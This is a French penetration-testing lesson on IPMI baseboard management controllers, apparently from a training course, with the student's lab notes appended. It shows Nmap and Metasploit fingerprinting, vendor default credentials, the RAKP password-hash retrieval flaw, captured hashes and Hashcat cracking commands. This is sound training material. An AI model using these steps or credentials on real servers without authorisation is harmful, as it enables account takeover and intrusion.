L'[`Intelligent Platform Management Interface`](https://www.thomas-krenn.com/en/wiki/IPMI_Basics) (`IPMI`) est un ensemble de spécifications normalisées pour les systèmes de gestion d'hôte matériels, utilisés pour la gestion et la surveillance des systèmes. Il agit comme un sous-système autonome et fonctionne indépendamment du BIOS, du CPU, du firmware et du système d'exploitation sous-jacent de l'hôte. L'IPMI permet aux administrateurs système de gérer et de surveiller les systèmes même s'ils sont éteints ou dans un état non réactif. Il fonctionne via une connexion réseau directe au matériel du système et ne nécessite pas d'accès au système d'exploitation via un shell de connexion. L'IPMI peut également être utilisé pour des mises à niveau à distance des systèmes sans nécessiter d'accès physique à l'hôte cible. L'IPMI est généralement utilisé de trois manières :

- Avant que le SE n'ait démarré pour modifier les paramètres du BIOS
- Lorsque l'hôte est complètement éteint
- Accès à un hôte après une défaillance du système

Lorsqu'il n'est pas utilisé pour ces tâches, l'IPMI peut surveiller un éventail de différents éléments tels que la température du système, la tension, l'état des ventilateurs et les blocs d'alimentation. Il peut également être utilisé pour interroger des informations d'inventaire, consulter des journaux matériels et envoyer des alertes via SNMP. Le système hôte peut être éteint, mais le module IPMI nécessite une source d'alimentation et une connexion LAN pour fonctionner correctement.

Le protocole IPMI a été publié pour la première fois par Intel en 1998 et est maintenant pris en charge par plus de 200 fournisseurs de systèmes, dont Cisco, Dell, HP, Supermicro, Intel, et d'autres. Les systèmes utilisant la version 2.0 d'IPMI peuvent être administrés via le port série sur LAN (serial over LAN), donnant aux administrateurs système la possibilité de visualiser la sortie de la console série en bande (in band). Pour fonctionner, l'IPMI nécessite les composants suivants :

- `Contrôleur de gestion de la carte mère (Baseboard Management Controller - BMC)` - Un microcontrôleur et un composant essentiel d'un IPMI
- `Intelligent Chassis Management Bus (ICMB)` - Une interface qui permet la communication d'un châssis à un autre
- `Intelligent Platform Management Bus (IPMB)` - étend le BMC
- Mémoire IPMI - stocke des éléments tels que le journal des événements système, les données du dépôt de stockage, et plus encore
- Interfaces de communication - interfaces système locales, interfaces série et LAN, ICMB et bus de gestion PCI

---

## Prise d'empreinte du service

L'IPMI communique sur le port UDP 623. Les systèmes qui utilisent le protocole IPMI sont appelés Contrôleurs de gestion de la carte mère (Baseboard Management Controllers - BMCs). Les BMCs sont généralement implémentés sous forme de systèmes ARM embarqués fonctionnant sous Linux, et connectés directement à la carte mère de l'hôte. Les BMCs sont intégrés à de nombreuses cartes mères mais peuvent également être ajoutés à un système sous la forme d'une carte PCI. La plupart des serveurs sont livrés avec un BMC ou prennent en charge l'ajout d'un BMC. Les BMCs que nous rencontrons le plus souvent lors des tests d'intrusion internes sont HP iLO, Dell DRAC et Supermicro IPMI. Si nous pouvons accéder à un BMC lors d'une évaluation, nous obtiendrions un accès complet à la carte mère de l'hôte et serions en mesure de surveiller, redémarrer, éteindre, ou même réinstaller le système d'exploitation de l'hôte. Obtenir l'accès à un BMC est presque équivalent à un accès physique à un système. De nombreux BMCs (y compris HP iLO, Dell DRAC et Supermicro IPMI) exposent une console de gestion web, un protocole d'accès à distance en ligne de commande tel que Telnet ou SSH, et le port UDP 623 qui, rappelons-le, est destiné au protocole réseau IPMI. Vous trouverez ci-dessous un exemple de scan Nmap utilisant le script NSE de Nmap [ipmi-version](https://nmap.org/nsedoc/scripts/ipmi-version.html) pour prendre l'empreinte du service.

#### Nmap

        shellsession
`ppporrkkky@htb[/htb]$ sudo nmap -sU --script ipmi-version -p 623 ilo.inlanfreight.local  Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-04 21:48 GMT Nmap scan report for ilo.inlanfreight.local (172.16.2.2) Host is up (0.00064s latency).  PORT    STATE SERVICE 623/udp open  asf-rmcp | ipmi-version: |   Version: |     IPMI-2.0 |   UserAuth: |   PassAuth: auth_user, non_null_user |_  Level: 2.0 MAC Address: 14:03:DC:674:18:6A (Hewlett Packard Enterprise)  Nmap done: 1 IP address (1 host up) scanned in 0.46 seconds`

Ici, nous pouvons voir que le protocole IPMI est bien à l'écoute sur le port 623, et que Nmap a identifié la version 2.0 du protocole. Nous pouvons également utiliser le module de scan de Metasploit [IPMI Information Discovery (auxiliary/scanner/ipmi/ipmi_version)](https://www.rapid7.com/db/modules/auxiliary/scanner/ipmi/ipmi_version/).

#### Analyse de version avec Metasploit

        shellsession
`msf6 > use auxiliary/scanner/ipmi/ipmi_version  msf6 auxiliary(scanner/ipmi/ipmi_version) > set rhosts 10.129.42.195 msf6 auxiliary(scanner/ipmi/ipmi_version) > show options   Module options (auxiliary/scanner/ipmi/ipmi_version):     Name       Current Setting  Required  Description    ----       ---------------  --------  -----------    BATCHSIZE  256              yes       The number of hosts to probe in each set    RHOSTS     10.129.42.195    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'    RPORT      623              yes       The target port (UDP)    THREADS    10               yes       The number of concurrent threads   msf6 auxiliary(scanner/ipmi/ipmi_version) > run  [*] Sending IPMI requests to 10.129.42.195->10.129.42.195 (1 hosts) [+] 10.129.42.195:623 - IPMI - IPMI-2.0 UserAuth(auth_msg, auth_user, non_null_user) PassAuth(password, md5, md2, null) Level(1.5, 2.0)  [*] Scanned 1 of 1 hosts (100% complete) [*] Auxiliary module execution completed`

Lors des tests d'intrusion internes, nous trouvons souvent des BMCs dont les administrateurs n'ont pas changé le mot de passe par défaut. Voici quelques mots de passe par défaut uniques à conserver dans nos aide-mémoires :

|Produit|Nom d'utilisateur|Mot de passe|
|---|---|---|
|Dell iDRAC|root|calvin|
|HP iLO|Administrator|chaîne aléatoire de 8 caractères composée de chiffres et de lettres majuscules|
|Supermicro IPMI|ADMIN|ADMIN|

Il est également essentiel d'essayer les mots de passe par défaut connus pour TOUS les services que nous découvrons, car ils sont souvent laissés inchangés et peuvent conduire à des gains rapides. Dans le cas des BMCs, ces mots de passe par défaut peuvent nous donner accès à la console web ou même un accès en ligne de commande via SSH ou Telnet.

---

## Paramètres dangereux

Si les identifiants par défaut ne permettent pas d'accéder à un BMC, nous pouvons nous tourner vers une [faille](https://web.archive.org/web/20260421071724/http://fish2.com/ipmi/remote-pw-cracking.html) dans le protocole RAKP d'IPMI 2.0. Pendant le processus d'authentification, le serveur envoie un hash SHA1 ou MD5 salé du mot de passe de l'utilisateur au client avant que l'authentification n'ait lieu. Ceci peut être exploité pour obtenir le hash de mot de passe pour N'IMPORTE QUEL compte utilisateur valide sur le BMC. Ces hashes de mot de passe peuvent ensuite être cassés hors ligne (offline) à l'aide d'une attaque par dictionnaire (dictionary attack) avec `Hashcat` en mode `7300`. Dans le cas d'un HP iLO utilisant un mot de passe d'usine par défaut, nous pouvons utiliser cette commande d'attaque par masque (mask attack) de Hashcat `hashcat -m 7300 ipmi.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u` qui essaie toutes les combinaisons de lettres majuscules et de chiffres pour un mot de passe de huit caractères.

Il n'y a pas de "correctif" direct à ce problème car la faille est un composant essentiel de la spécification IPMI. Les clients peuvent opter pour des mots de passe très longs et difficiles à casser ou mettre en œuvre des règles de segmentation réseau pour restreindre l'accès direct aux BMCs. Il est important de ne pas négliger l'IPMI lors des tests d'intrusion internes (nous le rencontrons lors de la plupart des évaluations) car non seulement nous pouvons souvent obtenir l'accès à la console web du BMC, ce qui est une découverte à haut risque, mais nous avons vu des environnements où un mot de passe unique (mais cassable) est défini et réutilisé plus tard sur d'autres systèmes. Lors d'un de ces tests d'intrusion, nous avons obtenu un hash IPMI, l'avons cassé hors ligne avec Hashcat, et avons pu nous connecter en SSH à de nombreux serveurs critiques de l'environnement en tant qu'utilisateur root et obtenir l'accès aux consoles de gestion web de divers outils de surveillance réseau.

Pour récupérer les hashes IPMI, nous pouvons utiliser le module Metasploit [IPMI 2.0 RAKP Remote SHA1 Password Hash Retrieval](https://www.rapid7.com/db/modules/auxiliary/scanner/ipmi/ipmi_dumphashes/).

#### Récupération des hashes avec Metasploit

        shellsession
`msf6 > use auxiliary/scanner/ipmi/ipmi_dumphashes  msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > set rhosts 10.129.42.195 msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > show options   Module options (auxiliary/scanner/ipmi/ipmi_dumphashes):     Name                 Current Setting                                                    Required  Description    ----                 ---------------                                                    --------  -----------    CRACK_COMMON         true                                                               yes       Automatically crack common passwords as they are obtained    OUTPUT_HASHCAT_FILE                                                                     no        Save captured password hashes in hashcat format    OUTPUT_JOHN_FILE                                                                        no        Save captured password hashes in john the ripper format    PASS_FILE            /usr/share/metasploit-framework/data/wordlists/ipmi_passwords.txt  yes       File containing common passwords for offline cracking, one per line    RHOSTS               10.129.42.195                                                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'    RPORT                623                                                                yes       The target port    THREADS              1                                                                  yes       The number of concurrent threads (max one per host)    USER_FILE            /usr/share/metasploit-framework/data/wordlists/ipmi_users.txt      yes       File containing usernames, one per line    msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > run  [+] 10.129.42.195:623 - IPMI - Hash found: ADMIN:8e160d4802040000205ee9253b6b8dac3052c837e23faa631260719fce740d45c3139a7dd4317b9ea123456789abcdefa123456789abcdef140541444d494e:a3e82878a09daa8ae3e6c22f9080f8337fe0ed7e [+] 10.129.42.195:623 - IPMI - Hash for user 'ADMIN' matches password 'ADMIN' [*] Scanned 1 of 1 hosts (100% complete) [*] Auxiliary module execution completed`

Expérimenter avec différentes listes de mots est crucial pour obtenir le mot de passe à partir du hash acquis.

Ici, nous pouvons voir que nous avons réussi à obtenir le hash de mot de passe pour l'utilisateur `ADMIN`, et que l'outil a pu le casser rapidement pour révéler ce qui semble être un mot de passe par défaut, `ADMIN`. À partir de là, nous pourrions tenter de nous connecter au BMC ou, si le mot de passe était plus unique, vérifier sa réutilisation sur d'autres systèmes. L'IPMI est très courant dans les environnements réseau, car les administrateurs système doivent pouvoir accéder aux serveurs à distance en cas de panne ou pour effectuer certaines tâches de maintenance qui, traditionnellement, auraient nécessité d'être physiquement devant le serveur. Cette facilité d'administration s'accompagne du risque d'exposer les hashes de mots de passe à n'importe qui sur le réseau et peut conduire à des accès non autorisés, à des perturbations du système et même à une exécution de code à distance (remote code execution). La recherche d'IPMI devrait faire partie de notre playbook de test d'intrusion interne pour tout environnement que nous évaluons.


Lab de fin  

![[Pasted image 20260910000944.png]]
il existe un vuln qui permet de capturer le hash des utilisateur valides on va l'essayer pour voir
![[Pasted image 20260910001125.png]]
comme utilisateur valide on a l'utilisateur admin 

![[Pasted image 20260910001333.png]]
on va essayer de casser le hash trouver avec hashcat 
dans mon cas j'ai copier le hash 
(344fe73082000000186e1e9712dae3565f64b331a133b9e876b656be25bfe47d54e0257a7ad2ac3ca123456789abcdefa123456789abcdef140  
561646d696e:c2219cf1083d67d6e7c90d2b75e40179c3d91183) dans un fichier nomé ok pour le brute-force 

la commande de brute-force : hashcat -m 7300 /chemin/versle/fichier/contenant/le/hash  /chemin/vers/la/wordlist

![[Pasted image 20260910001740.png]]

le résulat :

![[Pasted image 20260910001845.png]]

on a peut cracker le hash et retrouver le mot de passe 
